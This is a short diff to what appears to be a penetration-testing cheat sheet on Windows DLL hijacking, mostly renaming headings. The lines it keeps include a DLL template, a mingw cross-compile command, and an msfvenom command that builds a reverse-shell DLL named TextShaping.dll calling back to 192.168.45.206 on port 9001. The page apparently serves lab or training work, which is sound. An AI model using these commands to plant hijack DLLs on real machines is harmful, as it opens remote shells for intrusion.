@@ -9,13 +9,11 @@
 5. Current directory
 6. Directories in `PATH`&#x20;
 
-
-
-#### Event Filtering
+### Event Filtering
 
 `Get-WinEvent -MaxEvents 30 | findstr backup`
 
-**Malicious DLL template:**
+#### **Custom DLL:**
 
 ```c
 #include <stdlib.h>
@@ -32,13 +30,13 @@ BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserve
 }
 ```
 
-**Cross-compile DLL:**
+**Cross-compilation locally:**
 
 ```bash
 x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
 ```
 
-**msfvenom DLL:**
+#### **msfvenom DLL:**
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp --arch x64 LHOST=192.168.45.206 LPORT=9001 -f dll -o TextShaping.dll
